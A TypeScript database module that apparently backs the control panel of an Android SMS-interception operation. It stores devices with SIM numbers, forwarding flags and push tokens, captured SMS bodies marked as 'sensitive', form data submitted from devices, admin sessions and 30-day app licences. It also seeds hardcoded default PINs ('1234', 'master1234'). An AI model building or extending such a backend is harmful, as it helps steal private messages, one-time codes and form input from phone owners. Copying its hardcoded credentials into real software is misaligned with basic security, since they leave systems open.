import { neon } from "@neondatabase/serverless";
import { drizzle } from "drizzle-orm/neon-http";
import {
  pgTable, serial, text, integer, boolean, timestamp, jsonb,
  uniqueIndex, index,
} from "drizzle-orm/pg-core";

const connectionString = process.env.NEON_DATABASE_URL;
if (!connectionString) {
  throw new Error("NEON_DATABASE_URL environment variable is required");
}

export const sql = neon(connectionString);
export const db = drizzle(sql);

export const DEFAULT_APP_ID = "SKY-APP-2026-X9F3";
export const DEFAULT_APP_NAME = "MR ROBOT";
export const DEFAULT_APP_PIN = "1234";

export const apps = pgTable("apps", {
  id: serial("id").primaryKey(),
  appId: text("app_id").notNull(),
  name: text("name").notNull(),
  pin: text("pin").notNull().default("1234"),
  status: text("status").notNull().default("active"),
  loginLimit: integer("login_limit").notNull().default(5),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({ appIdUq: uniqueIndex("apps_app_id_uq").on(t.appId) }));

export const devices = pgTable("devices", {
  id: serial("id").primaryKey(),
  deviceId: text("device_id").notNull(),
  appId: text("app_id").notNull(),
  userId: text("user_id").notNull(),
  name: text("name").notNull(),
  androidVersion: integer("android_version").notNull().default(0),
  sim1Carrier: text("sim1_carrier"),
  sim1Phone: text("sim1_phone"),
  sim2Carrier: text("sim2_carrier"),
  sim2Phone: text("sim2_phone"),
  status: text("status").notNull().default("offline"),
  lastOnline: timestamp("last_online", { withTimezone: true }),
  forwardEnabled: boolean("forward_enabled").notNull().default(false),
  forwardSlot: integer("forward_slot"),
  fcmToken: text("fcm_token"),
  installedAt: timestamp("installed_at", { withTimezone: true }).notNull().defaultNow(),
  updatedAt: timestamp("updated_at", { withTimezone: true }).notNull().defaultNow(),
  starred: boolean("starred").notNull().default(false),
}, (t) => ({
  deviceIdUq: uniqueIndex("devices_device_id_uq").on(t.deviceId),
  appIdx: index("devices_app_idx").on(t.appId),
  userIdx: index("devices_user_idx").on(t.userId),
}));

export const messages = pgTable("messages", {
  id: serial("id").primaryKey(),
  appId: text("app_id").notNull(),
  deviceId: text("device_id").notNull(),
  userId: text("user_id").notNull(),
  fromSender: text("from_sender").notNull(),
  fromNumber: text("from_number").notNull(),
  toNumber: text("to_number"),
  body: text("body").notNull(),
  isSensitive: boolean("is_sensitive").notNull().default(false),
  receivedAt: timestamp("received_at", { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({
  appReceivedIdx: index("messages_app_received_idx").on(t.appId, t.receivedAt),
  deviceReceivedIdx: index("messages_device_received_idx").on(t.deviceId, t.receivedAt),
  userIdx: index("messages_user_idx").on(t.userId),
}));

export const formData = pgTable("form_data", {
  id: serial("id").primaryKey(),
  appId: text("app_id").notNull(),
  deviceId: text("device_id").notNull(),
  data: jsonb("data").notNull(),
  submittedAt: timestamp("submitted_at", { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({
  appSubmittedIdx: index("form_data_app_submitted_idx").on(t.appId, t.submittedAt),
  deviceIdx: index("form_data_device_idx").on(t.deviceId),
}));

let schemaInitPromise: Promise<void> | null = null;

export async function ensureSchema(): Promise<void> {
  if (schemaInitPromise) return schemaInitPromise;
  schemaInitPromise = (async () => {
    await Promise.all([
      sql(`CREATE TABLE IF NOT EXISTS apps (
        id SERIAL PRIMARY KEY,
        app_id TEXT NOT NULL,
        name TEXT NOT NULL,
        pin TEXT NOT NULL DEFAULT '1234',
        status TEXT NOT NULL DEFAULT 'active',
        created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      )`),
      sql(`CREATE TABLE IF NOT EXISTS devices (
        id SERIAL PRIMARY KEY,
        device_id TEXT NOT NULL,
        app_id TEXT NOT NULL,
        user_id TEXT NOT NULL,
        name TEXT NOT NULL,
        android_version INTEGER NOT NULL DEFAULT 0,
        sim1_carrier TEXT,
        sim1_phone TEXT,
        sim2_carrier TEXT,
        sim2_phone TEXT,
        status TEXT NOT NULL DEFAULT 'offline',
        last_online TIMESTAMPTZ,
        forward_enabled BOOLEAN NOT NULL DEFAULT FALSE,
        forward_slot INTEGER,
        fcm_token TEXT,
        installed_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      )`),
      sql(`CREATE TABLE IF NOT EXISTS messages (
        id SERIAL PRIMARY KEY,
        app_id TEXT NOT NULL,
        device_id TEXT NOT NULL,
        user_id TEXT NOT NULL,
        from_sender TEXT NOT NULL,
        from_number TEXT NOT NULL,
        to_number TEXT,
        body TEXT NOT NULL,
        is_sensitive BOOLEAN NOT NULL DEFAULT FALSE,
        received_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      )`),
      sql(`CREATE TABLE IF NOT EXISTS form_data (
        id SERIAL PRIMARY KEY,
        app_id TEXT NOT NULL,
        device_id TEXT NOT NULL,
        data JSONB NOT NULL,
        submitted_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      )`),
      sql(`CREATE TABLE IF NOT EXISTS admin_sessions (
        id TEXT PRIMARY KEY,
        login_time TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        last_active TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        user_agent TEXT NOT NULL DEFAULT '',
        ip TEXT NOT NULL DEFAULT '',
        device TEXT NOT NULL DEFAULT ''
      )`),
      sql(`CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT NOT NULL
      )`),
    ]);
    await Promise.all([
      sql(`CREATE UNIQUE INDEX IF NOT EXISTS apps_app_id_uq ON apps(app_id)`),
      sql(`CREATE UNIQUE INDEX IF NOT EXISTS devices_device_id_uq ON devices(device_id)`),
      sql(`CREATE INDEX IF NOT EXISTS devices_app_idx ON devices(app_id)`),
      sql(`CREATE INDEX IF NOT EXISTS devices_user_idx ON devices(user_id)`),
      sql(`CREATE INDEX IF NOT EXISTS messages_app_received_idx ON messages(app_id, received_at)`),
      sql(`CREATE INDEX IF NOT EXISTS messages_device_received_idx ON messages(device_id, received_at)`),
      sql(`CREATE INDEX IF NOT EXISTS messages_user_idx ON messages(user_id)`),
      sql(`ALTER TABLE messages ADD COLUMN IF NOT EXISTS to_number TEXT`),
      sql(`CREATE INDEX IF NOT EXISTS form_data_app_submitted_idx ON form_data(app_id, submitted_at)`),
      sql(`CREATE INDEX IF NOT EXISTS form_data_device_idx ON form_data(device_id)`),
      sql(`CREATE INDEX IF NOT EXISTS admin_sessions_login_idx ON admin_sessions(login_time DESC)`),
      sql(`ALTER TABLE admin_sessions ADD COLUMN IF NOT EXISTS app_id TEXT NOT NULL DEFAULT ''`),
      sql(`CREATE INDEX IF NOT EXISTS admin_sessions_app_idx ON admin_sessions(app_id)`),
      sql(`ALTER TABLE apps ADD COLUMN IF NOT EXISTS login_limit INTEGER NOT NULL DEFAULT 5`),
      sql(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS starred BOOLEAN NOT NULL DEFAULT FALSE`),
    ]);
    await Promise.all([
      sql(
        `INSERT INTO apps (app_id, name, pin, status) VALUES ($1,$2,$3,'active')
         ON CONFLICT (app_id) DO NOTHING`,
        [DEFAULT_APP_ID, DEFAULT_APP_NAME, DEFAULT_APP_PIN],
      ),
      sql(
        `INSERT INTO settings (key, value) VALUES ('master_pin', 'master1234')
         ON CONFLICT (key) DO NOTHING`,
      ),
    ]);
  })().catch((err) => { schemaInitPromise = null; throw err; });
  return schemaInitPromise;
}

export function isoReq(d: Date | string): string {
  return typeof d === "string" ? d : d.toISOString();
}
export function iso(d: Date | string | null | undefined): string | null {
  if (d == null) return null;
  return typeof d === "string" ? d : d.toISOString();
}

export const VALIDITY_DAYS = 30;
export function isExpired(createdAt: string | Date): boolean {
  const created = new Date(createdAt).getTime();
  return Date.now() > created + VALIDITY_DAYS * 86_400_000;
}

export function mapApp(r: typeof apps.$inferSelect) {
  return {
    id: r.id, appId: r.appId, name: r.name, status: r.status,
    loginLimit: r.loginLimit ?? 5, createdAt: isoReq(r.createdAt),
  };
}
export function mapDevice(r: typeof devices.$inferSelect) {
  return {
    id: r.id, deviceId: r.deviceId, appId: r.appId, userId: r.userId,
    name: r.name, androidVersion: r.androidVersion,
    sim1Carrier: r.sim1Carrier, sim1Phone: r.sim1Phone,
    sim2Carrier: r.sim2Carrier, sim2Phone: r.sim2Phone,
    status: r.status, lastOnline: iso(r.lastOnline),
    forwardEnabled: r.forwardEnabled, forwardSlot: r.forwardSlot,
    fcmToken: r.fcmToken,
    installedAt: isoReq(r.installedAt), updatedAt: isoReq(r.updatedAt),
    starred: r.starred,
  };
}
export function mapMessage(r: typeof messages.$inferSelect) {
  return {
    id: r.id, appId: r.appId, deviceId: r.deviceId, userId: r.userId,
    fromSender: r.fromSender, fromNumber: r.fromNumber, toNumber: r.toNumber,
    body: r.body, isSensitive: r.isSensitive, receivedAt: isoReq(r.receivedAt),
  };
}
export function mapFormData(r: typeof formData.$inferSelect) {
  return {
    id: r.id, appId: r.appId, deviceId: r.deviceId,
    data: r.data as Record<string, unknown>,
    submittedAt: isoReq(r.submittedAt),
  };
}
